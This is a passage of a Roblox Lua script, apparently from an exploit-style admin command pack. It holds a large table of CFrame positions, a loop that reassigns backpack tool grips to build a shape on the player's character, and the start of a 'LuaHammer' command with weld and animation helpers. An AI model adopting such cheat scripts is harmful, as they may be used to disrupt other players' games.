CFrame.new(-1.265164852142334, 1.499998927116394, -2.234834671020508),
CFrame.new(1.7348341941833496, 1.5000009536743164, -0.23483578860759735),
CFrame.new(-1.765164852142334, -0.5000015497207642, 3.2651658058166504),
CFrame.new(4.734836578369141, -2.699997663497925, -1.8348363637924194),
CFrame.new(5.734832763671875, 3.000001907348633, -1.234834909439087),
CFrame.new(4.734833717346191, 2.5000011920928955, 2.7651655673980713),
CFrame.new(1.7348341941833496, 1.5000009536743164, 1.7651644945144653),
CFrame.new(5.234833717346191, 2.0000016689300537, -2.234834671020508),
CFrame.new(1.2348341941833496, 0.9999998211860657, -1.2348353862762451),
CFrame.new(3.2348344326019287, 1.5000020265579224, -3.2348344326019287),
CFrame.new(4.234834671020508, 2.5000011920928955, -3.234834671020508),
CFrame.new(-2.765164613723755, 0.9999988675117493, -3.234834671020508),
CFrame.new(5.234833717346191, 1.5000009536743164, 0.7651643753051758),
CFrame.new(3.134834051132202, 1.929410696029663, 7.148129940032959),
CFrame.new(-1.2651629447937012, -2.700000047683716, 2.1651651859283447),
CFrame.new(1.2348341941833496, 1.5000004768371582, -1.2348353862762451),
CFrame.new(5.234833717346191, 2.0000016689300537, -4.234834671020508),
CFrame.new(5.234834671020508, -0.9999987483024597, 2.765164613723755),
CFrame.new(1.2348341941833496, 1.0000005960464478, -4.734834671020508),
CFrame.new(-1.265164852142334, 1.4999984502792358, 0.7651643753051758),
CFrame.new(2.2348344326019287, 1.5000009536743164, -1.2348353862762451),
CFrame.new(-1.765164852142334, 1.4999979734420776, -1.234834909439087),
CFrame.new(4.234834671020508, 0.500002384185791, -1.2348353862762451),
CFrame.new(-1.265164852142334, 1.4999984502792358, 2.7651655673980713),
CFrame.new(-2.265164613723755, 1.9999982118606567, 1.7651644945144653),
CFrame.new(4.734836578369141, -2.699997663497925, -1.8348363637924194),
CFrame.new(-1.7651629447937012, -3.0000009536743164, -3.234834909439087),
CFrame.new(3.2348363399505615, -2.699998140335083, 2.1651651859283447),
CFrame.new(-1.265164852142334, 2.4999988079071045, -1.234834909439087),
CFrame.new(2.2348363399505615, -2.699998617172241, -2.8348355293273926),
CFrame.new(5.234834671020508, -1.499998688697815, 0.7651643753051758),
CFrame.new(1.2348341941833496, 1.5000004768371582, 0.7651643753051758),
CFrame.new(5.234833717346191, 1.5000009536743164, 1.7651644945144653),
CFrame.new(-0.7651649713516235, 1.9999996423721313, -4.734834671020508),
CFrame.new(4.734834671020508, 2.0000011920928955, 1.7651644945144653),
CFrame.new(0.7348340749740601, 1.5, 0.7651643753051758),
CFrame.new(5.234834671020508, -0.9999987483024597, 0.7651643753051758),
CFrame.new(0.13483475148677826, 1.233012318611145, 5.415163993835449),
CFrame.new(-0.26516294479370117, -2.6999995708465576, -2.8348355293273926),
CFrame.new(-1.7651629447937012, -2.700000047683716, -0.8348362445831299),
CFrame.new(-2.265162706375122, -3.6464476585388184, -8.588387489318848),
CFrame.new(5.234835624694824, -2.6999971866607666, -2.8348355293273926),
CFrame.new(0.23483513295650482, 1.5000009536743164, -3.2348344326019287),
CFrame.new(4.734836578369141, -2.699997663497925, 2.1651651859283447),
CFrame.new(5.734833717346191, 1.5000009536743164, 3.2651658058166504),
CFrame.new(1.2348361015319824, -2.999999761581421, -3.734834909439087),
CFrame.new(0.13483475148677826, 1.9294092655181885, 7.648129940032959),
CFrame.new(-1.765164852142334, 1.9999991655349731, -4.234834671020508),
CFrame.new(-0.26516294479370117, -2.6999995708465576, 0.16516387462615967),
CFrame.new(-2.265162706375122, -5.000000476837158, -6.734835624694824),
CFrame.new(0.23483513295650482, 1.5, 2.7651655673980713),
CFrame.new(1.134833812713623, 1.6705905199050903, 5.682201385498047),
CFrame.new(4.234834671020508, 1.5000009536743164, 0.7651643753051758),
CFrame.new(1.2348361015319824, -2.6999990940093994, -2.8348355293273926),
CFrame.new(0.23483704030513763, -2.6999990940093994, -2.8348355293273926),
CFrame.new(-0.265164852142334, 1.5, 0.7651643753051758),
CFrame.new(4.234836578369141, -2.9999983310699463, -3.734834909439087),
CFrame.new(5.234833717346191, 1.5000009536743164, 2.7651655673980713),
CFrame.new(-0.8651653528213501, 1.4294092655181885, 9.148130416870117),
CFrame.new(-0.7651649713516235, 1.5, 0.7651643753051758),
CFrame.new(4.234834671020508, 2.0000011920928955, 2.765164613723755),
CFrame.new(0.23483704030513763, -2.999999761581421, -4.234835624694824),
CFrame.new(3.7348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(5.234834671020508, -1.4999982118606567, 1.7651644945144653),
CFrame.new(4.234836578369141, -4.999998092651367, -5.234834671020508),
CFrame.new(-1.2651629447937012, -2.700000047683716, -0.8348362445831299),
CFrame.new(5.234834671020508, -0.49999797344207764, -4.734834671020508),
CFrame.new(5.734835624694824, -2.6999971866607666, -2.8348355293273926),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(4.234834671020508, -0.49999821186065674, -4.734834671020508),
CFrame.new(-0.7651649713516235, 1.5, 2.7651655673980713),
CFrame.new(4.734834671020508, 2.0000016689300537, -2.234834671020508),
CFrame.new(1.2348341941833496, 0.4999997615814209, -1.2348353862762451),
CFrame.new(2.2348344326019287, 0.5000002384185791, -0.7348358035087585),
CFrame.new(-2.265162706375122, -2.500000238418579, -8.734833717346191),
CFrame.new(3.734832525253296, 3.0000009536743164, 2.765164613723755),
CFrame.new(1.2348341941833496, -2.8312214794823376e-07, -1.2348353862762451),
CFrame.new(4.234834671020508, 0.5000016689300537, -4.734834671020508),
CFrame.new(-0.8651653528213501, 1.929409146308899, 6.648129463195801),
CFrame.new(-1.765164852142334, -5.215405849412491e-07, -4.734834671020508),
CFrame.new(-0.7651649713516235, 1.5, 1.7651644945144653),
CFrame.new(-1.265164852142334, 2.499999761581421, 3.765164852142334),
CFrame.new(-0.7651649713516235, 1.5, -0.23483578860759735),
CFrame.new(-2.265164613723755, 1.4999979734420776, 1.7651644945144653),
CFrame.new(3.2348344326019287, -1.499998688697815, -4.734834671020508),
CFrame.new(4.234834671020508, -0.9999982714653015, -8.734833717346191),
CFrame.new(-1.765164852142334, 0.9999991059303284, -2.234834909439087),
CFrame.new(4.234834671020508, 2.0000011920928955, -0.23483578860759735),
CFrame.new(4.134834289550781, 1.9294111728668213, 8.148130416870117),
CFrame.new(-0.7651630640029907, -2.6999995708465576, 1.1651639938354492),
CFrame.new(1.7348341941833496, 1.5000009536743164, -3.2348344326019287),
CFrame.new(4.234836578369141, -4.999999046325684, -3.234835147857666),
CFrame.new(-0.7651630640029907, -5, -4.734835624694824),
CFrame.new(4.734836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(-0.26516294479370117, -2.6999995708465576, 0.16516387462615967),
CFrame.new(-1.765164852142334, 2.4999992847442627, 1.7651644945144653),
CFrame.new(5.234834671020508, -1.4999982118606567, -2.234834909439087),
CFrame.new(5.234834671020508, -1.9999983310699463, 2.7651655673980713),
CFrame.new(4.234834671020508, 0.500002384185791, 0.7651643753051758),
CFrame.new(1.2348341941833496, -0.9999992251396179, -8.734833717346191),
CFrame.new(-0.7651668787002563, 2.9999988079071045, -3.234834671020508),
CFrame.new(4.134834289550781, 1.9294111728668213, 7.148129940032959),
CFrame.new(1.2348341941833496, 0.9999998211860657, -1.2348353862762451),
CFrame.new(2.2348363399505615, -2.9999988079071045, -8.734833717346191),
CFrame.new(2.2348344326019287, 1.0000003576278687, -1.2348353862762451),
CFrame.new(-1.265164852142334, 0.9999993443489075, 4.265164375305176),
CFrame.new(-0.7651630640029907, -1.0000001192092896, -4.734834671020508),
CFrame.new(1.7348341941833496, 1.0000001192092896, -1.2348353862762451),
CFrame.new(1.2348361015319824, -2.6999990940093994, 2.1651651859283447),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(0.7348350286483765, -5.215407554715057e-07, -1.2348353862762451),
CFrame.new(5.234833717346191, 2.0000011920928955, 2.765164613723755),
CFrame.new(-1.265164852142334, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-1.765164852142334, 1.499998927116394, -2.234834671020508),
CFrame.new(5.734832763671875, 3.000002384185791, -0.23483578860759735),
CFrame.new(2.2348344326019287, 0.5000007152557373, -0.23483578860759735),
CFrame.new(4.734833717346191, 2.5000011920928955, 0.7651643753051758),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(1.2348341941833496, -2.8312214794823376e-07, -1.2348353862762451),
CFrame.new(-2.265164613723755, 2.4999988079071045, -1.234834909439087),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(3.134834051132202, 0.9294106960296631, 9.648130416870117),
CFrame.new(-2.765164613723755, 0.9999988675117493, -4.234834671020508),
CFrame.new(-1.7651629447937012, -1.500000238418579, -4.734835624694824),
CFrame.new(1.2348361015319824, -4.999999046325684, -5.234834671020508),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -1.2348353862762451),
CFrame.new(3.2348363399505615, -2.699998140335083, -1.8348363637924194),
CFrame.new(1.7348361015319824, -2.699998617172241, 1.1651639938354492),
CFrame.new(-1.765164852142334, 2.4999988079071045, 0.7651643753051758),
CFrame.new(5.234834671020508, -0.9999982714653015, -4.234835624694824),
CFrame.new(-1.2651629447937012, -2.700000047683716, -1.8348363637924194),
CFrame.new(1.7348341941833496, -4.4703583057525975e-08, 1.7651644945144653),
CFrame.new(-1.7651629447937012, -2.700000047683716, 0.16516387462615967),
CFrame.new(-1.265164852142334, 1.499998927116394, -4.234834671020508),
CFrame.new(2.134834051132202, 1.9294102191925049, 8.648130416870117),
CFrame.new(4.734834671020508, 1.000001311302185, 2.765164613723755),
CFrame.new(-1.7651629447937012, -3.0000009536743164, -3.234834909439087),
CFrame.new(0.7348350286483765, -2.6999990940093994, 2.1651651859283447),
CFrame.new(-0.26516294479370117, -2.6999995708465576, 2.1651651859283447),
CFrame.new(-2.265162706375122, -4.000000476837158, -8.234833717346191),
CFrame.new(2.2348363399505615, -2.9999988079071045, -4.234835624694824),
CFrame.new(2.2348344326019287, -0.9999992251396179, -8.734833717346191),
CFrame.new(3.2348363399505615, -4.999999046325684, -2.734834909439087),
CFrame.new(1.2348341941833496, 1.5000009536743164, -4.234834671020508),
CFrame.new(-2.265162706375122, -2.700000047683716, -1.8348363637924194),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -8.734833717346191),
CFrame.new(-1.7651629447937012, -2.700000047683716, -1.8348363637924194),
CFrame.new(-2.265162706375122, -3.5000014305114746, -3.234835147857666),
CFrame.new(-0.7651630640029907, -3.292893409729004, -8.941941261291504),
CFrame.new(-0.8651653528213501, 1.9294092655181885, 8.148130416870117),
CFrame.new(1.7348361015319824, -2.699998617172241, -0.8348362445831299),
CFrame.new(-1.7651629447937012, -2.500000238418579, -3.234834909439087),
CFrame.new(5.234834671020508, -1.4999982118606567, -0.23483578860759735),
CFrame.new(-0.7651630640029907, -2.6999995708465576, -1.8348363637924194),
CFrame.new(2.134834051132202, 1.6705909967422485, 5.682201385498047),
CFrame.new(5.234836578369141, -4.999999046325684, -3.234835147857666),
CFrame.new(4.234834671020508, -0.9999982714653015, -8.734833717346191),
CFrame.new(-0.7651649713516235, 1.4999994039535522, -4.734834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, 1.1651639938354492),
CFrame.new(1.2348361015319824, -2.6999990940093994, 0.16516387462615967),
CFrame.new(2.2348363399505615, -4.999999046325684, -4.734835624694824),
CFrame.new(5.234834671020508, -0.9999982714653015, -3.234834909439087),
CFrame.new(-0.8651653528213501, 1.6705900430679321, 5.68220329284668),
CFrame.new(3.2348344326019287, 1.5000009536743164, 2.7651655673980713),
CFrame.new(4.134834289550781, 1.4294111728668213, 9.148130416870117),
CFrame.new(3.7348363399505615, -2.699998140335083, 2.1651651859283447),
CFrame.new(-0.7651649713516235, 0.9999991059303284, 1.7651644945144653),
CFrame.new(-2.265162706375122, -2.700000047683716, 2.1651651859283447),
CFrame.new(-1.265164852142334, 2.4999992847442627, -4.234834671020508),
CFrame.new(5.234832763671875, 2.5000011920928955, -1.234834909439087),
CFrame.new(-2.7651665210723877, 2.9999988079071045, -2.2348344326019287),
CFrame.new(-2.765164613723755, 0.9999983906745911, -1.2348353862762451),
CFrame.new(4.734836578369141, -2.699997663497925, -2.8348355293273926),
CFrame.new(1.134833812713623, 0.9294102191925049, 9.648130416870117),
CFrame.new(-1.765164852142334, 1.4999979734420776, 1.7651644945144653),
CFrame.new(1.7348361015319824, -2.699998617172241, 2.1651651859283447),
CFrame.new(2.7348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(4.734834671020508, -0.9999987483024597, 0.7651643753051758),
CFrame.new(2.2348363399505615, -4.999999046325684, -5.234834671020508),
CFrame.new(0.7348340749740601, 1.5, 2.7651655673980713),
CFrame.new(-1.765164852142334, 0.9999993443489075, -4.734835624694824),
CFrame.new(1.2348341941833496, 1.5000009536743164, -2.234834909439087),
CFrame.new(-1.7651629447937012, -2.700000047683716, 2.1651651859283447),
CFrame.new(0.7348369359970093, -2.6999990940093994, -2.8348355293273926),
CFrame.new(2.7348344326019287, 1.0000003576278687, -1.2348353862762451),
CFrame.new(-1.765164852142334, -5.215405849412491e-07, -4.734835624694824),
CFrame.new(2.134834051132202, 0.4294102191925049, 10.148130416870117),
CFrame.new(1.7348361015319824, -2.699998617172241, -1.8348363637924194),
CFrame.new(-0.7651630640029907, -2.500000238418579, -4.734835624694824),
CFrame.new(3.2348363399505615, -2.699998140335083, -2.8348355293273926),
CFrame.new(5.234834671020508, -1.4999982118606567, 2.765164613723755),
CFrame.new(3.2348363399505615, -2.699998140335083, -0.8348362445831299),
CFrame.new(4.734834671020508, 1.5000009536743164, 0.7651643753051758),
CFrame.new(2.7348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(2.2348363399505615, -2.699998617172241, 1.1651639938354492),
CFrame.new(3.7348363399505615, -2.699998140335083, 1.1651639938354492),
CFrame.new(2.2348363399505615, -1.9999988079071045, -4.734835624694824),
CFrame.new(1.2348341941833496, 1.5000004768371582, 2.7651655673980713),
CFrame.new(5.234833717346191, 1.5000009536743164, -1.234834909439087),
CFrame.new(3.2348363399505615, -2.9999988079071045, -3.734834909439087),
CFrame.new(-2.265162706375122, -2.700000047683716, 1.1651639938354492),
CFrame.new(-0.7651649713516235, 1.5, -1.2348353862762451),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -8.734833717346191),
CFrame.new(2.2348344326019287, 9.08970832824707e-07, -4.734834671020508),
CFrame.new(-0.8651653528213501, 0.9294092655181885, 9.648130416870117),
CFrame.new(-1.7651629447937012, -5.000000476837158, -2.734834909439087),
CFrame.new(5.234834671020508, -0.9999987483024597, 1.7651644945144653),
CFrame.new(-1.765164852142334, 2.4999988079071045, 2.7651655673980713),
CFrame.new(5.234834671020508, -1.4999982118606567, -1.2348353862762451),
CFrame.new(3.134834051132202, 1.929410696029663, 8.648130416870117),
CFrame.new(-1.265164852142334, 2.4999992847442627, -2.234834671020508),
CFrame.new(4.234836578369141, -2.699997663497925, 1.1651639938354492),
CFrame.new(-1.7651629447937012, -2.000000238418579, -1.2348353862762451),
CFrame.new(2.7348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(2.2348363399505615, -2.699998617172241, 0.16516387462615967),
CFrame.new(-0.7651630640029907, -5, -7.234835624694824),
CFrame.new(2.134834051132202, 0.9294102191925049, 9.648130416870117),
CFrame.new(-2.265162706375122, -2.700000047683716, -0.8348362445831299),
CFrame.new(4.234834671020508, 2.0000011920928955, -4.234834671020508),
CFrame.new(4.734834671020508, 1.0000017881393433, -2.234834909439087),
CFrame.new(-0.265164852142334, 1.5, 0.7651643753051758),
CFrame.new(3.2348344326019287, 1.5000020265579224, -4.234834671020508),
CFrame.new(-0.265164852142334, 1.5000004768371582, -0.23483578860759735),
CFrame.new(5.234836578369141, -4.999998092651367, -4.734835624694824),
CFrame.new(-1.765164852142334, 0.9999986290931702, 0.7651643753051758),
CFrame.new(1.7348341941833496, -0.5000001192092896, -1.2348353862762451),
CFrame.new(5.734835624694824, -2.6999971866607666, -1.8348363637924194),
CFrame.new(5.234833717346191, 2.0000011920928955, 1.7651644945144653),
CFrame.new(5.734835624694824, -2.6999971866607666, 1.1651639938354492),
CFrame.new(4.234834671020508, 2.0000011920928955, -1.234834909439087),
CFrame.new(0.13483475148677826, 1.929409146308899, 6.648129463195801),
CFrame.new(4.234836578369141, -2.699997663497925, 2.1651651859283447),
CFrame.new(0.23483513295650482, -0.9999997019767761, -4.734834671020508),
CFrame.new(5.234835624694824, -2.999997854232788, -3.734834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(-1.765164852142334, 1.499998927116394, -3.234834671020508),
CFrame.new(1.134833812713623, 1.2330127954483032, 5.415163993835449),
CFrame.new(1.134833812713623, 0.3669877052307129, 4.915163993835449),
CFrame.new(4.734836578369141, -2.699997663497925, -2.8348355293273926),
CFrame.new(3.2348363399505615, -2.699998140335083, 1.1651639938354492),
CFrame.new(-0.7651630640029907, -3.000000476837158, -4.234835624694824),
CFrame.new(-2.265162706375122, -1.5000007152557373, -8.734833717346191),
CFrame.new(-1.265164852142334, 2.4999992847442627, -0.23483578860759735),
CFrame.new(4.734834671020508, 1.5000009536743164, 2.7651655673980713),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -2.234834909439087),
CFrame.new(3.7348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(2.7348344326019287, 1.5000015497207642, -2.234834909439087),
CFrame.new(1.7348341941833496, -4.4703583057525975e-08, -1.2348353862762451),
CFrame.new(3.7348344326019287, 1.000001311302185, -0.23483578860759735),
CFrame.new(1.2348361015319824, -4.999999523162842, -2.734834909439087),
CFrame.new(0.23483608663082123, -1.9999992847442627, -4.734835624694824),
CFrame.new(4.234834671020508, 0.000002339482307434082, -2.234834909439087),
CFrame.new(5.234835624694824, -2.999997854232788, -8.734833717346191),
CFrame.new(5.734834671020508, -3.9999985694885254, -3.234835147857666),
CFrame.new(-0.8651653528213501, 0.3669872283935547, 4.915163993835449),
CFrame.new(-0.8651653528213501, 0.7999997735023499, 5.165163993835449),
CFrame.new(1.2348361015319824, -2.6999990940093994, 1.1651639938354492),
CFrame.new(-0.7651668787002563, 2.9999992847442627, -4.234834671020508),
CFrame.new(1.2348361015319824, -2.6999990940093994, -1.8348363637924194),
CFrame.new(2.7348344326019287, 1.5000009536743164, 1.7651644945144653),
CFrame.new(-1.7651629447937012, -2.5000011920928955, 1.7651644945144653),
CFrame.new(0.23483513295650482, -4.4703497792397684e-08, -4.734834671020508),
CFrame.new(-0.7651630640029907, -1.500000238418579, -4.734834671020508),
CFrame.new(-1.7651629447937012, -2.5000011920928955, 2.765164613723755),
CFrame.new(5.234833717346191, 2.0000016689300537, -0.23483578860759735),
CFrame.new(-1.765164852142334, 0.4999992847442627, -4.734835624694824),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(4.734834671020508, 1.5000015497207642, -2.234834671020508),
CFrame.new(-0.8651653528213501, 0.4294092655181885, 10.148130416870117),
CFrame.new(5.234834671020508, -1.999997854232788, -0.23483578860759735),
CFrame.new(5.734834671020508, -2.49999737739563, -8.734833717346191),
CFrame.new(0.23483513295650482, 1.5000009536743164, -2.234834909439087),
CFrame.new(3.2348344326019287, 0.0000011473892982394318, -4.734834671020508),
CFrame.new(-1.7651629447937012, -3.000000476837158, -4.234835624694824),
CFrame.new(4.234836578369141, -2.699997663497925, -0.8348362445831299),
CFrame.new(0.23483513295650482, 0.5, -4.734834671020508),
CFrame.new(3.134834051132202, 1.2330135107040405, 5.415163993835449),
CFrame.new(-2.7651665210723877, 2.9999983310699463, -3.234834671020508),
CFrame.new(-1.7651629447937012, -1.5000011920928955, 0.7651643753051758),
CFrame.new(0.13483475148677826, 0.3669872283935547, 4.915163993835449),
CFrame.new(5.234833717346191, 1.5000009536743164, 0.7651643753051758),
CFrame.new(2.2348344326019287, -1.4999991655349731, -4.734834671020508),
CFrame.new(4.134834289550781, 1.670591950416565, 5.682201385498047),
CFrame.new(2.7348344326019287, 4.3213358935645374e-07, -1.2348353862762451),
CFrame.new(5.734835624694824, -4.499998569488525, -3.234835147857666),
CFrame.new(-1.265164852142334, 0.5000002384185791, 1.7651644945144653),
CFrame.new(4.734834671020508, 1.0000017881393433, -0.23483578860759735),
CFrame.new(3.134834051132202, 1.9294105768203735, 6.648129463195801),
CFrame.new(-0.7651630640029907, -4.707106590270996, -7.527728080749512),
CFrame.new(-1.7651629447937012, -2.700000047683716, 0.16516387462615967),
CFrame.new(1.2348341941833496, 1.0000003576278687, -0.23483578860759735),
CFrame.new(1.2348361015319824, -2.9999992847442627, -3.234834909439087),
CFrame.new(1.2348341941833496, 0.4999997615814209, -1.2348353862762451),
CFrame.new(4.234834671020508, 0.000002339482307434082, 0.7651643753051758),
CFrame.new(0.23483704030513763, -2.6999990940093994, 1.1651639938354492),
CFrame.new(4.234834671020508, 0.0000016242265701293945, -4.734834671020508),
CFrame.new(3.7348344326019287, 1.5000009536743164, -4.734834671020508),
CFrame.new(1.2348361015319824, -2.9999992847442627, -4.234835624694824),
CFrame.new(0.13483475148677826, 0.4294092655181885, 10.148130416870117),
CFrame.new(-2.265164613723755, 1.9999991655349731, -4.234834671020508),
CFrame.new(4.234834671020508, 0.500002384185791, 0.7651643753051758),
CFrame.new(5.234835624694824, -2.6999971866607666, -0.8348362445831299),
CFrame.new(5.234832763671875, 2.5000011920928955, 2.7651655673980713),
CFrame.new(0.23483704030513763, -5.000000476837158, -3.234835147857666),
CFrame.new(-1.7651629447937012, -3.0000009536743164, -3.734835147857666),
CFrame.new(3.2348363399505615, -2.9999988079071045, -3.234834909439087),
CFrame.new(1.2348361015319824, -2.4999992847442627, -4.734835624694824),
CFrame.new(1.2348341941833496, 1.5000009536743164, -3.2348344326019287),
CFrame.new(4.234834671020508, 1.000001311302185, 3.7651658058166504),
CFrame.new(-1.265164852142334, -0.49999964237213135, -1.2348353862762451),
CFrame.new(0.13483475148677826, 1.9294092655181885, 8.148130416870117),
CFrame.new(-1.265164852142334, 1.999998688697815, 0.7651643753051758),
CFrame.new(-1.765164852142334, 1.9999982118606567, -1.234834909439087),
CFrame.new(4.234834671020508, 1.5000009536743164, 1.7651644945144653),
CFrame.new(5.234834671020508, -2.499997854232788, -1.2348358631134033),
CFrame.new(1.134833812713623, 0.800000011920929, 5.165163040161133),
CFrame.new(4.234834671020508, -0.49999797344207764, 2.765164613723755),
CFrame.new(3.2348344326019287, -0.49999868869781494, -4.734834671020508),
CFrame.new(-2.265164613723755, 1.9999982118606567, -1.234834909439087),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(-1.765164852142334, 0.9999991059303284, -0.23483578860759735),
CFrame.new(1.7348341941833496, 1.5000009536743164, 0.7651643753051758),
CFrame.new(4.734834671020508, 1.5000009536743164, 1.7651644945144653),
CFrame.new(-1.765164852142334, 0.4999985694885254, 3.2651658058166504),
CFrame.new(4.234834671020508, 2.5000016689300537, 3.765164852142334),
CFrame.new(4.734834671020508, 0.5000019073486328, -4.734834671020508),
CFrame.new(-0.8651653528213501, 1.9294092655181885, 7.148129940032959),
CFrame.new(-1.7651629447937012, -2.000000238418579, -2.234834909439087),
CFrame.new(0.23483513295650482, 1.0000003576278687, -4.734834671020508),
CFrame.new(1.7348341941833496, 1.5000009536743164, -2.234834909439087),
CFrame.new(4.234834671020508, 2.5000016689300537, -4.234834671020508),
CFrame.new(1.2348361015319824, -4.70710563659668, -7.527728080749512),
CFrame.new(5.734833717346191, 1.0000020265579224, -2.234834909439087),
CFrame.new(-1.765164852142334, 2.4999988079071045, -1.234834909439087),
CFrame.new(4.134834289550781, 1.2330139875411987, 5.415163993835449),
CFrame.new(4.234836578369141, -2.699997663497925, -1.8348363637924194),
CFrame.new(5.734834671020508, -1.4999977350234985, -8.734833717346191),
CFrame.new(4.234834671020508, 1.5000009536743164, -3.234834671020508),
CFrame.new(3.2348363399505615, -2.9999988079071045, -3.234834909439087),
CFrame.new(2.2348344326019287, 0.5000007152557373, -4.734834671020508),
CFrame.new(-1.265164852142334, 1.4999984502792358, 0.7651643753051758),
CFrame.new(1.7348341941833496, 1.0000001192092896, -1.2348353862762451),
CFrame.new(-1.7651629447937012, -3.000000476837158, -8.734833717346191),
CFrame.new(5.234834671020508, -2.4999983310699463, 0.7651643753051758),
CFrame.new(1.2348341941833496, 0.9999998211860657, -1.2348353862762451),
CFrame.new(3.2348344326019287, 1.000001311302185, -8.734833717346191),
CFrame.new(0.23483704030513763, -2.999999761581421, -3.734834909439087),
CFrame.new(-0.7651649713516235, 1.5, -4.234834671020508),
CFrame.new(-1.765164852142334, 0.4999992847442627, -4.734834671020508),
CFrame.new(-1.265164852142334, 1.999998688697815, 2.765164613723755),
CFrame.new(2.134834051132202, 1.9294100999832153, 6.648129463195801),
CFrame.new(4.234836578369141, -2.9999983310699463, -3.234834909439087),
CFrame.new(-1.7651629447937012, -2.500000238418579, -2.234835147857666),
CFrame.new(-2.7651665210723877, 2.9999983310699463, 0.7651643753051758),
CFrame.new(-0.7651649713516235, 0.9999998211860657, -4.734834671020508),
CFrame.new(3.2348344326019287, 1.5000020265579224, -0.23483578860759735),
CFrame.new(-1.265164852142334, 2.4999988079071045, 2.7651655673980713),
CFrame.new(-2.765164613723755, 0.9999988675117493, -0.23483578860759735),
CFrame.new(0.7348369359970093, -2.6999990940093994, 0.16516387462615967),
CFrame.new(-0.7651649713516235, 0.4999997615814209, -4.734834671020508),
CFrame.new(5.234835624694824, -2.999997854232788, -4.234834671020508),
CFrame.new(-1.2651629447937012, -2.700000047683716, 1.1651639938354492),
CFrame.new(-0.7651649713516235, -2.8312206268310547e-07, -4.734834671020508),
CFrame.new(0.23483704030513763, -2.6999990940093994, -0.8348362445831299),
CFrame.new(0.13483475148677826, 1.9294092655181885, 8.648130416870117),
CFrame.new(5.234834671020508, -0.9999982714653015, -0.23483578860759735),

}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then


v.Grip = Handles[i-1] 
v.Parent = game.Players.LocalPlayer.Character
end
end 

end)
--same cmd finished
AddCmd('LuaHammer','',function()
local oc = oc or function(...) return ... end

function weld(p0,p1,c0,c1,par)
local w = Instance.new("Weld",p0 or par)
w.Part0 = p0
w.Part1 = p1
w.C0 = c0 or CFrame.new()
w.C1 = c1 or CFrame.new()
return w
end

function lerp(a, b, t)
    return a + (b - a)*t
end

do
        local function QuaternionFromCFrame(cf) local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() local trace = m00 + m11 + m22 if trace > 0 then local s = math.sqrt(1 + trace) local recip = 0.5/s return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 else local i = 0 if m11 > m00 then i = 1 end if m22 > (i == 0 and m00 or m11) then i = 2 end if i == 0 then local s = math.sqrt(m00-m11-m22+1) local recip = 0.5/s return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip elseif i == 1 then local s = math.sqrt(m11-m22-m00+1) local recip = 0.5/s return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip elseif i == 2 then local s = math.sqrt(m22-m00-m11+1) local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip end end end
         
        local function QuaternionToCFrame(px, py, pz, x, y, z, w) local xs, ys, zs = x + x, y + y, z + z local wx, wy, wz = w*xs, w*ys, w*zs local xx = x*xs local xy = x*ys local xz = x*zs local yy = y*ys local yz = y*zs local zz = z*zs return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) end
         
        local function QuaternionSlerp(a, b, t) local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] local startInterp, finishInterp; if cosTheta >= 0.0001 then if (1 - cosTheta) > 0.0001 then local theta = math.acos(cosTheta) local invSinTheta = 1/math.sin(theta) startInterp = math.sin((1-t)*theta)*invSinTheta finishInterp = math.sin(t*theta)*invSinTheta  else startInterp = 1-t finishInterp = t end else if (1+cosTheta) > 0.0001 then local theta = math.acos(-cosTheta) local invSinTheta = 1/math.sin(theta) startInterp = math.sin((t-1)*theta)*invSinTheta finishInterp = math.sin(t*theta)*invSinTheta else startInterp = t-1 finishInterp = t end end return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp        end

        function clerp(a,b,t)
                local qa = {QuaternionFromCFrame(a)}
                local qb = {QuaternionFromCFrame(b)}
                local ax, ay, az = a.x, a.y, a.z
                local bx, by, bz = b.x, b.y, b.z

                local _t = 1-t
                return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t))
        end
end
local his = {}

function ctween(tar,prop,c2,t,b)
        local function doIt()
        local now = tick()
        his[tar] = now
        local c1 = tar[prop]
        for i=1,t do
                if his[tar] ~= now then return end
                tar[prop] = clerp(c1,c2,1/t*i)
                wait(1/60)
        end
        end
        if b then coroutine.wrap(doIt)() else doIt() end
end

function tickwave(time,length,offset)
        return (math.abs((tick()+(offset or 0))%time-time/2)*2-time/2)/time/2*length
end

function playSound(id,parent,volume,pitch)
        local sound = Instance.new("Sound",parent or workspace)
        sound.SoundId = "http://www.roblox.com/asset?id="..id
        sound.Volume = volume or 1
